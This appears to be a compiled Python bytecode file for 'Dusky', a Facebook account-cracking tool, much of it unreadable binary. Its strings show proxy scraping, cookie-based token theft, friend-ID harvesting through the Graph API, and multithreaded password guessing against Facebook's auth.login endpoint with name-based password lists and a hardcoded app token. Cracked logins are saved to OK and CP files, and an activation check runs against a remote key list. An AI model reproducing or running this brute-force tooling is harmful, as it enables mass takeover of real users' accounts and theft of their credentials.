o
    ù*c¬3  ã                
   @   sV  d d Z ddlZddlZddlZddlmZ zddlZddlZddlZddl	Z	ddl
Z
W n   e d¡ e d¡ e d¡ ed Y ddlZddlZddlZddl	Z	ddl
Z
ze	 d	¡jZed
d e¡ W n   ed e ¡  Y g ZedD ]	Ze e
 ¡ ¡ q{dadadDddZg Zdag Zdadag Zda da!da"dZ#dZ$dZ%dZ&dZ'e	 (¡ Z)dd Z*d +g e*  de' de$ de$ de' de$ de$ de' de% d e$ d!e$ d"e$ de' d#e$ d$e$ d%e$ de' d&e$ d'e$ d(e$ d)e' ¡Z,d*a-d+d, Z.d-d. Z/d/d0 Z0d1d2 Z1d3d4 Z2d5d6 Z3d7d8 Z4ze	 d9¡Z5W n   ee$ d: e ¡  Y e6e 7¡ Z8d; +e8¡Z9e9Z:e: ;d<¡Z<e =e<¡Z>e> ?d<¡Z@ee, ee' d=e& e@ e'  e@e@kree% d> e Ad?¡ e3  dS eBe$ d@e% dAe$ dBe% dCe' 	 dS )Ec                   C   s   t  d¡ d S )NÚclear)ÚosÚsystem© r   r   údusky.pyr      s   r   é    N)ÚThreadPoolExecutorzpip install regexzpip install requestszpip install user_agentz[ + ] Run Tool Againzvhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=100000&country=all&ssl=all&anonymity=allz	.prox.txtÚwz[ - ] Erorréd   Ú çü©ñÒMbP?c                 C   s2   | d D ]}t j |¡ t j ¡  t |¡ qd S )NÚ
)ÚsysÚstdoutÚwriteÚflushÚtimeÚsleep)ÚzÚsÚir   r   r   r      s
   
ýr   z[34;1mz[31;1mz[32;1mz[33;1mz[0mc                  C   s4   t  dd¡} | dkrtS | dkrtS | dkrtS tS )Né   é   é   )ÚrandomÚrandintÚGÚBÚR)Zdar   r   r   Úc15   s   r   u/  
âââââââ âââ   âââââââ   âââ âââââââ 
ââââââââââââ âââââââââ  ââââââââââââ
âââ  âââ âââââââ ââââââ ââââââ   âââ
âââ  âââ  âââââ  âââââââââââââ   âââ
ââââââââ   âââ   âââ âââââââââââââââ
âââââââ    âââ   âââ  âââââ âââââââz 
u   ââââââââââââââââââââââââââââââââââââââââââ  
õ   â z	Owner  : u"   @DYNO_1668                    â
z	Github : zhttps://github.com/Z
DYNOHACKERu    â
z	ADMIN  : z	@i4m_marou                        â
zCreated By : z
@M_MAJIC_Cu                   â
u~   ââââââââââââââââââââââââââââââââââââââââââr   c                  C   sB  t   d\aatdd ¡ } t   tt tt dt  t	 t
  tt|   tjddddd	d
ddddd	d| id}t d|j¡}t	d7 a	z	| d¡a| aW n%   tt d t	dkrotj d¡rkt d¡ t  nt  t	d7 a	Y tt dt
  t d¡ tj d¡rt d¡ tdd | ¡}t  t	d7 a	d S )N)r
   r
   ú.cok.txtÚrz[ ! ] ú0https://business.facebook.com/business_locationsúMozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36úhttps://www.facebook.com/úbusiness.facebook.comúhttps://business.facebook.comÚ1ú#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7ú	max-age=0ú¬text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8útext/html; charset=utf-8©	ú
user-agentZrefererÚhostÚoriginzupgrade-insecure-requestszaccept-languagezcache-controlZacceptúcontent-typeÚcookie©ÚheadersÚcookiesú	(EAAG\w+)r   ú[ - ] Failedr   õ   [ â ] Success Loginr   r   )r   ÚTOKENÚCOOKIESÚopenÚreadÚprintÚban1ÚYr   ÚattemptÚRRÚrequestsÚgetÚreÚsearchÚtextÚgroupr   r   ÚpathÚexistsÚremoveÚc_loginÚa_loginr   r   r   r   Úmenu)Zcok_fileÚdataÚ
find_tokenÚcokr   r   r   rK   V   s:   (



rK   c            	      C   s   t  ¡  d\aaadad} t  tt ztt	dt
 dt daW n ty=   tt
 dt  t d¡ t  Y nw tdksFtd	krWtt
 dt  t d¡ t  ttD ]}d}d} |d7 }t t¡}d
d| i}|dkr÷t	dt| d}tjd| d t dti|d ¡ }zd|d v r tt
 dt  W n	 tyª   Y nw z5|d d D ]}t  |d d |d  ¡ t |d ¡ | d7 } q²tt dt  t|  t  d}W n tyò   tt
 dt  Y nw |dkstq[tt
 dt dt
 dt
 dt d t
 d!t
 dt d"t
 d#t
 d$ t	t
 d%t d&t  }|d'ks,d)atd-t
 dt d.t
 d/t
 dt  d0t
 d1t
 dt  d2t
 d#t
 d3 tt	t
 d%t d&t  }|d'ksj|d(krot!  d S |d*ksy|d+kr~t"  d S d S )4N)r   r   r   r
   r   z[ ? ] How Much Id For Crack ? [Z10u
   ] ââ> z[ ? ] Erorrr   é
   Úhttpzhttps://ú[ u    ] ID ââ> z https://graph.facebook.com/v1.0/z)?fields=friends.limit(9999)&access_token=r4   )r4   Zproxiesip  Úcodez[ ! ] BlockedZfriendsrM   Úidú|Únamez[ + ] Dump : z[ ! ] Failed Dumpu!   â­ââââââââââZProtocolu"   âââââââââââ®
u   âz [ 1 ] Mobileu                  â
z [ 2 ] Normal (Fast)u           â 
uZ   â°âââââââââââââââââââââââââââââ¯ZDynou    ââ>r'   Ú01ZmobileÚ2Z02Znormalr   Z	Passwordsu(   âââââââââââââ®
z [ 1 ] Choice Pass (7)u            â 
z [ 2 ] All pass Is Hereuc   â°ââââââââââââââââââââââââââââââââ¯)#Úidsr   ÚloopÚcpÚokÚtype_protocolr<   r=   ÚintÚinputr   r@   Úid_limitÚ
ValueErrorr   r   Úfriends_cloneÚranger   ÚchoiceÚproxÚstrÚsesrB   r8   r9   ÚjsonÚKeyErrorÚappendÚids_r   r   r   Úchoice_passwordÚall_pass)	Z
total_dumpr   Z
fail_checkÚproxyZproxsrT   ZdatÚtrd   r   r   r   rb   ~   s´   


ý

$ÿ
 ÿðÿÿÿþþþ
ý
ÿÿÿþþþýýý
ü

ÿrb   c            
   	   C   s²  g } |   ¡  t   tt td tt dt dt dt d tt dt dt dt d tt d tt d	 td
t  tddø}t	D ]í}d}d}g } | 
d¡d | 
d¡d  ¡ }}| 
d¡d }| 
d¡d }|dkr||}n|dkr|}n|| }|  || ¡ |  |¡ |  |d ¡ |  |d ¡ |  |d ¡ |  |d ¡ |  |d ¡ |  |d ¡ |  |d ¡ |  |d ¡ |  |d ¡ |  |d ¡ |  || ¡ |  || ¡ |  || ¡ tdD ]}	|d7 }|  || ¡ qò|  d¡ |  d¡ |  || d ¡ |  || ¡ |  || ¡ |  || | ¡ |  || | ¡ | t|| |¡ qNW d    n	1 sGw   Y  tdt d  t  d S )!Nz"[ + ] Password-Type : All Passwordú	[ + ] OK ú	Saved in ú:ú OK_DYNO.txtú	[ + ] CP ú CP_DYNO.txtú[ + ] Crack Startedú[ ! ] To Stop CTRL+Zú!---------------------------------é   ©Úmax_workersr
   iÏ  rU   r   r   ú r   Z123Z1234Z12345Z123456Z1234567Z12345678Z	123456789Z112233Z11223344Z123123rP   r   z[ + ] Crack Complate ....)r   r<   r=   r   r   r   r@   r>   r   rY   ÚsplitÚlowerrj   rc   ÚsubmitÚapi_1r_   rL   )
ZpwvÚgZyuzongZnmZbirthZidfÚnmfZfrsZlsnr   r   r   r   rm   Æ   sj     "


Úÿ(
rm   c               	   C   s  t   tt tdD ]} | d7 } tdt  t|  t d}t 	|¡ qt
t dt dt dt d t
t d	t dt dt d
 t
t d t
t d t
dt  tdd$}tD ]}| d¡d }| d¡d }| t|t|¡ qcW d    d S 1 sw   Y  d S )Né   r   rR   u    ] Password ââ> rp   rq   rr   rs   rt   ru   rv   rw   rx   ry   rz   rU   r   )r   r<   r=   rc   r_   r   rf   r@   Úpassword_listrj   r   r   r   r>   r   rY   r}   r   r   )r   Zpass_ÚthreadrT   Zadr   r   r   r   rl   ü   s$     ý"ÿrl   c                  C   s&  t   tt td tdt dt d tdt dt dt d tdt dt d	t d
 td tdt dt dt  d} | dksM| dkrPt  | dkrftt dt  t	 
d¡ t ¡  | dkrtt dt  t	 
d¡ t d¡ t  d S tt d t	 
d¡ t  d S )NuF   âââââââââââMENUâââââââââââr   z[ 01 ] Clone Friendsu      âz[ 88 ] ZLogoutu             âz[ 99 ] ZExitu	       	 âuN   ââââââââââââââââââââââââââu   ââZDYNOu   ââ>r|   rW   r'   Z99z
[ ! ] Exitr   z[ ! ] Logoutr    z[ ! ] WRONG CHOICE)r   r<   r=   r   r@   r   r_   r   rb   r   r   r   Úexitr   rI   rJ   rL   )rd   r   r   r   rL     s,   





rL   c                  C   sö   t   tj d¡rt  tt tt t	 dt dt
  } tjdddddd	d
dddd	d| id}t d|j¡}z| d¡}W n   tt d t d¡ t  Y t d¡ tj d¡ret d¡ tt dt  tdd | ¡}t  d S )Nr    ZCookiesu	    ââ> r"   r#   r$   r%   r&   r'   r(   r)   r*   r+   r,   r1   r2   r5   r   r6   r7   r   )r   r   rG   rH   rK   r<   r=   r_   r@   r>   r   rA   rB   rC   rD   rE   rF   r   r   r   rJ   rI   r   r:   r   rL   )ZcokirM   rN   rO   r   r   r   rJ   *  s&   (



rJ   c                 C   sZ  t  t¡}t  t¡}| }|}zt d¡ W n	 ty   Y nw tdt dt  t	t
 dt	tt dt dt	t dt t dt	t dd	 tj ¡  |D ]Ö}t|d
k r[ q't	t  dd¡t	t  dd¡t	t  dd¡dd|ddd}ztjdt	| d t	| d |d}	W n tjjy   t d¡ Y nw zd|	 ¡ d kr«W  q'W n   Y d|	jv rðd|	jv rðd| d| d| d }
td! tt d"| d| d#| d$t 	 td%d& |
¡ td'7 at
d'7 a
 q'd(|	 ¡ d) v r&d| d| d| d*}
tt d+| d| d#| d,t 	 td-d& |
¡ td'7 a q'qPt
d'7 a
d S ).NZsaveúu   [ðððð] ú/r|   zOK/zCP/r
   )Úendé   g    ÐsAg    8|Ai N  i@  Z	EXCELLENTz!cell.CTRadioAccessTechnologyHSDPAz!application/x-www-form-urlencodedZLiger)zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-typer-   r0   zx-fb-http-enginez?https://b-api.facebook.com/method/auth.login?format=json&email=z
&password=a®  &credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true)r3   r   ie  Z
error_codeZsession_keyZEAAAz
Name     : z
ID       : z
PassWord : z

==========DUSKY-OK==========
r   u[   ââââââââââ[ððððâ±OK]ââââââââââ
Name : z
ID : uT   
ââââââââââ[ððððâ±OK]ââââââââââzOK_DYNO.txtÚar   zwww.facebook.comZ	error_msgz
==========DUSKY-CP==========
u[   ââââââââââ[ððððâ±CP]ââââââââââ
Name : uT   
ââââââââââ[ððððâ±CP]ââââââââââzCP_DYNO.txt) r   rd   Úuser_ar   ÚmkdirÚOSErrorr<   r   r   rf   rZ   ÚlenrY   r\   r@   r>   r[   r   r   r   r   rg   rB   rA   Ú
exceptionsÚConnectionErrorr   r   rh   rE   r:   r   )ÚargÚprV   Zua1Zua2ÚuserZpasZpwsZheaders_Zresponser   r   r   r   r   F  sz   

ÿ^ø*ÿÿÿþý$ÿþý$÷
r   z:https://raw.githubusercontent.com/sizar78/config/main/Keysz[ ! ] Errorz-_Úasciiz[ ? ] YOUR ID : z[ + ] Your Id is Active !g      ø?z[ - ] Your Id Is Not Active To ZActivez	 Id Send z
@DYNO_1668)r   )Cr   r   r   r   Úconcurrent.futuresr   r   rC   Úbase64rA   Z
user_agentr   r<   rB   rE   re   r:   r   r   r   rc   r   rj   Zgenerate_user_agentr8   r9   rk   r]   r   r`   rV   rY   rZ   r\   r[   r   r   r   r>   r@   ZSessionrg   r   Újoinr=   r?   rK   rb   rm   rl   rL   rJ   r   rM   rf   ÚgetloginZuuidZuid1ZiduÚencodeZuiidZ	b64encodeZ	base64_idÚdecodeZuidr   r_   r   r   r   r   Ú<module>   sÔ   ,



(

úùøøø	÷	÷	÷	÷	÷
ö
ö
ö
öõõõõôô(H6A







(